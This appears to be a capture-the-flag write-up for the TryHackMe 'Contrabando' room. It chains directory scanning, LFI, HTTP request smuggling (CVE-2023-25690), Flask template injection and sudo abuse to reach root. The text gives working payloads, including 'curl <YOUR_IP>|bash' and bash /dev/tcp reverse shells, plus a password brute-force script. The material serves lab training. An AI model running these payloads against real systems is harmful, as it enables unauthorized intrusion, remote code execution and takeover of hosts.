## Room : https://tryhackme.com/room/contrabando

## 1\. Setup & Target Configuration

Before starting, add the target IP and hostname into `/etc/hosts` to simplify requests.

```bash
echo "10.10.136.151 contrabando.thm" | sudo tee -a /etc/hosts
```

This ensures that requests to `contrabando.thm` resolve correctly.

---

## 2\. Nmap Scan and Service Enumeration

Run a full aggressive port scan to enumerate all services and versions.

```bash
sudo nmap -p- -sCV --min-rate 10000 -v contrabando.thm
```

**Key results:**

* **SSH 22/tcp** — OpenSSH 8.2p1 Ubuntu
    
* **HTTP 80/tcp** — Apache 2.4.55 (Unix)
    

We’ll begin by focusing on the web service.

---

## 3\. Directory/File Enumeration: Custom Python Scanner

Normal tools like `gobuster` or `feroxbuster` struggle with **soft-404 filtering** on this host.  
To bypass this, a **custom Python directory scanner** (`pythn-dir-scan.py`) was written.

### Python Script: `pythn-dir-scan.py`

```python
#!/usr/bin/env python3
import sys, re, uuid, html
import concurrent.futures as cf
from collections import Counter
from urllib.parse import urlparse, urlunparse, unquote
import requests
import difflib

WORDLIST = [
    "index.php", "gen.php", "config.php", "login.php", "admin.php",
    "upload.php", "dashboard.php", "api.php", "home.php", "readme.txt",
    "robots.txt", "config.inc.php", "db.php", "backup.zip", "backup.sql",
    "composer.json", "server-status", "test.php", "phpinfo.php", "assets/"
]

GOOD_CODES = {200, 204, 301, 302, 307, 308, 401, 403}
SIM_THRESHOLD = 0.96
SIZE_JITTER_BYTES = 48
MAJORITY_SIZE_RATIO = 0.60

def normalize_base(url: str) -> str:
    u = url.strip()
    if not u:
        raise ValueError("Empty URL.")
    parsed = urlparse(u if "://" in u else "http://" + u)
    path = parsed.path if parsed.path.endswith("/") else (parsed.path + "/")
    return urlunparse((parsed.scheme, parsed.netloc, path, "", "", ""))

def fetch(session: requests.Session, url: str, timeout: float = 7.0):
    r = session.get(url, timeout=timeout, allow_redirects=False)
    length = r.headers.get("Content-Length")
    size = int(length) if (length and length.isdigit()) else len(r.content)
    return r.status_code, size, r.text, r.headers

def strip_html(text: str) -> str:
    text = re.sub(r"(?is)<script.*?>.*?</script>", "", text)
    text = re.sub(r"(?is)<style.*?>.*?</style>", "", text)
    text = re.sub(r"(?is)<[^>]+>", " ", text)
    text = html.unescape(text)
    text = re.sub(r"\s+", " ", text).strip().lower()
    return text

def remove_path_echoes(text: str, word: str, token: str) -> str:
    candidates = {word, unquote(word), html.unescape(word)}
    candidates |= {token, unquote(token), html.unescape(token)}
    if word.endswith('/'):
        candidates.add(word[:-1])
    patt = re.compile("|".join(re.escape(c) for c in candidates if c), flags=re.IGNORECASE)
    return patt.sub("", text)

def compare_path_aware(body_a: str, body_b: str, word: str, token: str) -> float:
    a = strip_html(remove_path_echoes(body_a, word, token))
    b = strip_html(remove_path_echoes(body_b, word, token))
    return difflib.SequenceMatcher(a=a, b=b).ratio()

def control_miss_url(base: str, length: int) -> str:
    tok = uuid.uuid4().hex
    if length <= len(tok):
        tok = tok[:length]
    else:
        tok = (tok * ((length // len(tok)) + 1))[:length]
    return base + tok, tok

def main():
    try:
        base = input("Base URL/path (e.g., http://contrabando.thm/page/): ").strip()
        base = normalize_base(base)
    except Exception as e:
        print(f"[!] Invalid URL: {e}")
        sys.exit(1)

    session = requests.Session()
    session.headers.update({"User-Agent": "dirscan/2.0 (path-aware soft404)"})

    targets = [base + word for word in WORDLIST]
    results = []

    print(f"[i] Scanning {len(targets)} paths under: {base}")
    with cf.ThreadPoolExecutor(max_workers=14) as ex:
        futs = {ex.submit(fetch, session, url): (url, word) for word, url in zip(WORDLIST, targets)}
        for fut in cf.as_completed(futs):
            url, word = futs[fut]
            try:
                code, size, text, hdrs = fut.result()
            except requests.RequestException:
                code, size, text = None, 0, ""
            results.append((word, url, code, size, text))

    size_counts = Counter(size for _, _, code, size, _ in results if code in GOOD_CODES)
    total_good = sum(size_counts.values())
    majority_sizes = set()
    if total_good:
        size, count = size_counts.most_common(1)[0]
        if count / total_good >= MAJORITY_SIZE_RATIO:
            majority_sizes.add(size)

    hits = []
    for word, url, code, size, text in results:
        if code not in GOOD_CODES:
            continue
        if majority_sizes and size in majority_sizes:
            pass
        ctrl_url, token = control_miss_url(base, len(word))
        try:
            c_code, c_size, c_text, _ = fetch(session, ctrl_url)
        except requests.RequestException:
            c_code, c_size, c_text = None, 0, ""
        if c_code and code in {401, 403} and c_code == 200:
            hits.append((code, size, url))
            print(f"[+] {code:<3} {size:>6}B  {url}    (auth/forbidden)")
            continue
        sim = compare_path_aware(text, c_text, word, token)
        size_close = abs(size - c_size) <= SIZE_JITTER_BYTES
        looks_soft = (sim >= SIM_THRESHOLD) and size_close
        if looks_soft:
            continue
        hits.append((code, size, url))
        print(f"[+] {code:<3} {size:>6}B  {url}")

    if not hits:
        print("[i] No non–soft-404 hits after path-aware filtering.")
    else:
        print("\n[i] Summary of hits (filtered):")
        for code, size, url in sorted(hits, key=lambda x: (x[0], x[1], x[2])):
            print(f"    {code:<3} {size:>6}B  {url}")

if __name__ == "__main__":
    main()
```

This scanner allowed bypassing soft-404 pages and correctly identifying real files.

### Discovered valid files:

* **/page/index.php** → vulnerable to **LFI**
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756507101772/89f97d43-ac87-4b8a-8a28-dde8f9e458e6.png align="center")
    
* **/page/gen.php** → vulnerable to **command injection**
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756507119228/765830c5-d752-4879-9e2e-4d9c2ce61cd2.png align="center")
    

---

## 4\. LFI Bypass and Exploitation with Double URL Encoding

To exploit **Local File Inclusion (LFI)**, use double URL encoding (`..%252f`).

```bash
curl --path-as-is "http://contrabando.thm/page/..%252f..%252f..%252f..%252f..%252f/etc/passwd"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756507075217/0cf94cac-4089-49f5-9489-3d802c89d5d8.png align="center")

This dumps `/etc/passwd` successfully.

---

## 5\. Exploiting HTTP Request Smuggling (CVE-2023-25690)

Setup reverse shell listener:

```bash
nc -lvnp 4444
printf '/bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1\n' > shell.sh
python3 -m http.server 80
```

Trigger the **request smuggling payload**:

```bash
curl --path-as-is "http://contrabando.thm/page/\
test%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0A\
POST%20/gen.php%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A\
Content-Type:%20application/x-www-form-urlencoded%0D%0A\
Content-Length:%2031%0D%0A%0D%0Alength=;curl%20<YOUR_IP>%7Cbash;%0D%0A%0D%0A\
GET%20/test"
```

This grants a reverse shell as `www-data` inside a container.

---

## 6\. Pivot to Host - Discover Internal Services

From the container shell, identify the host IP:

```bash
HOST=$(awk '$2=="00000000"{printf "%d.%d.%d.%d\n","0x"substr($3,7,2),"0x"substr($3,5,2),"0x"substr($3,3,2),"0x"substr($3,1,2); exit}' /proc/net/route)
echo "$HOST"
```

Scan internal services:

```bash
for p in 80 8080 5000 3000 443; do
  code=$(curl -s -m 1 -o /dev/null -w "%{http_code}" "http://$HOST:$p/")
  [ "$code" != "000" ] && echo "reachable $p (HTTP $code)" || echo "no HTTP $p"
done
```

Port **5000** runs a vulnerable Flask app.

---

## 7\. Exploit Flask SSTI

### Step 1: Confirm SSTI

```bash
printf '{{7*7}}' > poc
python3 -m http.server 80
curl -s -X POST "http://$HOST:5000/" -d "website_url=http://<YOUR_IP>/poc" | grep -o 49 || echo "no 49"
```

### Step 2: Reverse Shell Payload

```bash
printf '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1\"").read() }}' > template
curl -X POST "http://$HOST:5000/" -d "website_url=http://<YOUR_IP>/template"
```

Start listener:

```bash
nc -lvnp 5555
```

This gives shell as **hansolo**.

---

## 8\. Capture User Flag

```bash
cat hansolo_userflag.txt
```

---

## 9\. Privilege Escalation: Vault Script Bypass & Password Brute-Force

Check sudo:

```bash
sudo -l
```

The `vault` script is vulnerable to glob matching. Use brute-force Python:

```python
import subprocess
import string

charset = string.ascii_letters + string.digits
password = ""

while True:
    found = False
    for char in charset:
        attempt = password + char + "*"
        print(f"\r[+] Password: {password+char}", end="")
        proc = subprocess.Popen(
            ["sudo", "/usr/bin/bash", "/usr/bin/vault"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = proc.communicate(input=attempt + "\n")
        if "Password matched!" in stdout:
            password += char
            found = True
            break
    if not found:
        break

print(f"\r[+] Final Password: {password}")
```

This brute-forces the vault password.

Now login as hansolo with discovered password:

```bash
ssh hansolo@10.10.136.151
hansolo@10.10.136.151's password:
```

---

## 10\. Privilege Escalation: Python2 RCE Root Shell

Run the vulnerable app:

```bash
sudo /usr/bin/python2 /opt/generator/app.py
```

When prompted, inject Python RCE:

```text
__import__("os").system("bash")
```

Now root shell:

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 11\. Capture Root Flag

```bash
cat /root/root.txt
```

---

# ✅ Completed: Contrabando Machine (TryHackMe)

This machine demonstrated:

* Advanced enumeration with custom Python tools
    
* Double URL encoding LFI
    
* HTTP Request Smuggling (CVE-2023-25690)
    
* Pivoting and Flask SSTI exploitation
    
* Privilege escalation via custom brute-forcing and Python2 RCE
    

---
